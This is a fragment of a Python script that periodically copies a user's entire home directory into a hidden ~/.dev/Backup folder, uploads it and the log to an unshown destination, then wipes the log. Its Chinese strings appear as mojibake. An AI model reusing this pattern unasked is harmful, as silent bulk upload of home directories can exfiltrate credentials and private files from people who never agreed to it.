            with open(log_file, 'r', encoding='utf-8', errors='ignore') as src:
                log_content = src.read()
            
            if not log_content or not log_content.strip():
                logging.warning("âš ï¸ æ—¥å¿—å†…å®¹ä¸ºç©ºï¼Œè·³è¿‡ä¸Šä¼ ")
                return
            
            # å†™å…¥å¤‡ä»½æ–‡ä»¶
            with open(backup_path, 'w', encoding='utf-8') as dst:
                dst.write(log_content)
            
            # éªŒè¯å¤‡ä»½æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ
            if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—æ–‡ä»¶åˆ›å»ºå¤±è´¥æˆ–ä¸ºç©º")
                return
            
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"ğŸ“„ å·²å¤åˆ¶å¤‡ä»½æ—¥å¿—åˆ°ä¸´æ—¶ç›®å½• ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)")
            
            # ä¸Šä¼ æ—¥å¿—æ–‡ä»¶
            logging.info(f"ğŸ“¤ å¼€å§‹ä¸Šä¼ å¤‡ä»½æ—¥å¿—æ–‡ä»¶ ({os.path.getsize(str(backup_path)) / 1024:.2f}KB)...")
            if backup_manager.upload_file(str(backup_path)):
                try:
                    with open(log_file, 'w', encoding='utf-8') as f:
                        f.write(f"=== ğŸ“ å¤‡ä»½æ—¥å¿—å·²äº {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ä¸Šä¼  ===\n")
                    logging.info("âœ… å¤‡ä»½æ—¥å¿—ä¸Šä¼ æˆåŠŸå¹¶å·²æ¸…ç©º")
                except Exception as e:
                    logging.error(f"âŒ å¤‡ä»½æ—¥å¿—æ›´æ–°å¤±è´¥: {e}")
            else:
                logging.error("âŒ å¤‡ä»½æ—¥å¿—ä¸Šä¼ å¤±è´¥")

        except (OSError, IOError, PermissionError) as e:
            logging.error(f"âŒ å¤åˆ¶æˆ–è¯»å–æ—¥å¿—æ–‡ä»¶å¤±è´¥: {e}")
        except Exception as e:
            logging.error(f"âŒ å¤„ç†æ—¥å¿—æ–‡ä»¶æ—¶å‡ºé”™: {e}")
            import traceback
            if backup_manager.config.DEBUG_MODE:
                logging.debug(traceback.format_exc())

        # æ¸…ç†ä¸´æ—¶ç›®å½•
        finally:
            try:
                if os.path.exists(str(temp_dir)):
                    shutil.rmtree(str(temp_dir))
            except Exception as e:
                if backup_manager.config.DEBUG_MODE:
                    logging.debug(f"æ¸…ç†ä¸´æ—¶ç›®å½•å¤±è´¥: {e}")
                
    except Exception as e:
        logging.error(f"âŒ å¤„ç†å¤‡ä»½æ—¥å¿—æ—¶å‡ºé”™: {e}")
        import traceback
        if backup_manager.config.DEBUG_MODE:
            logging.debug(traceback.format_exc())

def clean_backup_directory():
    backup_dir = Path.home() / ".dev/Backup"
    try:
        if not os.path.exists(backup_dir):
            return

        keep_files = ["backup.log", "next_backup_time.txt"]  # æ·»åŠ æ—¶é—´é˜ˆå€¼æ–‡ä»¶åˆ°ä¿ç•™åˆ—è¡¨
        
        for item in os.listdir(backup_dir):
            item_path = os.path.join(backup_dir, item)
            try:
                if item in keep_files:
                    continue
                    
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    shutil.rmtree(item_path)
                    
                if BackupConfig.DEBUG_MODE:
                    logging.info(f"ğŸ—‘ï¸ å·²æ¸…ç†: {item}")
            except Exception as e:
                logging.error(f"âŒ æ¸…ç† {item} å¤±è´¥: {e}")
                
        logging.critical("ğŸ§¹ å¤‡ä»½ç›®å½•å·²æ¸…ç†å®Œæˆ")
    except Exception as e:
        logging.error(f"âŒ æ¸…ç†å¤‡ä»½ç›®å½•æ—¶å‡ºé”™: {e}")

def save_next_backup_time(backup_manager):
    """ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´åˆ°é˜ˆå€¼æ–‡ä»¶"""
    try:
        next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
        with open(backup_manager.config.THRESHOLD_FILE, 'w', encoding='utf-8') as f:
            f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
        if backup_manager.config.DEBUG_MODE:
            logging.info(f"â° å·²ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        logging.error(f"âŒ ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")

def should_perform_backup(backup_manager):
    """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½"""
    try:
        if not os.path.exists(backup_manager.config.THRESHOLD_FILE):
            return True
            
        with open(backup_manager.config.THRESHOLD_FILE, 'r', encoding='utf-8') as f:
            threshold_time_str = f.read().strip()
            
        threshold_time = datetime.strptime(threshold_time_str, '%Y-%m-%d %H:%M:%S')
        current_time = datetime.now()
        
        if current_time >= threshold_time:
            if backup_manager.config.DEBUG_MODE:
                logging.info("â° å·²åˆ°è¾¾å¤‡ä»½æ—¶é—´")
            return True
        else:
            if backup_manager.config.DEBUG_MODE:
                logging.info(f"â³ æœªåˆ°å¤‡ä»½æ—¶é—´ï¼Œä¸‹æ¬¡å¤‡ä»½: {threshold_time_str}")
            return False
            
    except Exception as e:
        logging.error(f"âŒ æ£€æŸ¥å¤‡ä»½æ—¶é—´å¤±è´¥: {e}")
        return True  # å‡ºé”™æ—¶é»˜è®¤æ‰§è¡Œå¤‡ä»½

def main():
    if not is_server():
        logging.critical("æœ¬è„šæœ¬ä»…é€‚ç”¨äºæœåŠ¡å™¨ç¯å¢ƒ")
        return

    try:
        backup_manager = BackupManager()
        
        # å…ˆæ¸…ç†å¤‡ä»½ç›®å½•
        clean_backup_directory()
        
        periodic_backup_upload(backup_manager)
    except KeyboardInterrupt:
        logging.critical("\nå¤‡ä»½ç¨‹åºå·²åœæ­¢")
    except Exception as e:
        logging.critical(f"ç¨‹åºå‡ºé”™: {e}")

def periodic_backup_upload(backup_manager):
    source = str(Path.home())
    target = Path.home() / ".dev/Backup/server"

    try:
        # è·å–ç”¨æˆ·å
        username = getpass.getuser()
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        logging.critical("\n" + "="*40)
        logging.critical(f"ğŸ‘¤ ç”¨æˆ·: {username}")
        logging.critical(f"ğŸš€ è‡ªåŠ¨å¤‡ä»½ç³»ç»Ÿå·²å¯åŠ¨  {current_time}")
        logging.critical("="*40)

        while True:
            try:
                # æ£€æŸ¥æ˜¯å¦åº”è¯¥æ‰§è¡Œå¤‡ä»½
                if not should_perform_backup(backup_manager):
                    time.sleep(3600)  # æ¯å°æ—¶æ£€æŸ¥ä¸€æ¬¡
                    continue

                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                logging.critical("\n" + "="*40)
                logging.critical(f"â° å¼€å§‹å¤‡ä»½  {current_time}")
                logging.critical("-"*40)

                logging.critical("\nğŸ–¥ï¸ æœåŠ¡å™¨æŒ‡å®šç›®å½•å¤‡ä»½")
                backup_server(backup_manager, source, target)
                
                if backup_manager.config.DEBUG_MODE:
                    logging.info("\nğŸ“ å¤‡ä»½æ—¥å¿—ä¸Šä¼ ")
                backup_and_upload_logs(backup_manager)

                # ä¿å­˜ä¸‹æ¬¡å¤‡ä»½æ—¶é—´
                save_next_backup_time(backup_manager)

                logging.critical("\n" + "="*40)
                next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                next_time = next_backup_time.strftime('%Y-%m-%d %H:%M:%S')
                logging.critical(f"âœ… å¤‡ä»½å®Œæˆ  {current_time}")
                logging.critical("="*40)
                logging.critical("ğŸ“‹ å¤‡ä»½ä»»åŠ¡å·²ç»“æŸ")
                logging.critical(f"ğŸ”„ ä¸‹æ¬¡å¯åŠ¨å¤‡ä»½æ—¶é—´: {next_time}")
                logging.critical("="*40 + "\n")

            except Exception as e:
                logging.error(f"\nâŒ å¤‡ä»½å‡ºé”™: {e}")
                try:
                    backup_and_upload_logs(backup_manager)
                except Exception as log_error:
                    logging.error("âŒ æ—¥å¿—å¤‡ä»½å¤±è´¥")
                time.sleep(60)

    except Exception as e:
        logging.error(f"âŒ å¤‡ä»½è¿‡ç¨‹å‡ºé”™: {e}")

if __name__ == "__main__":
    main()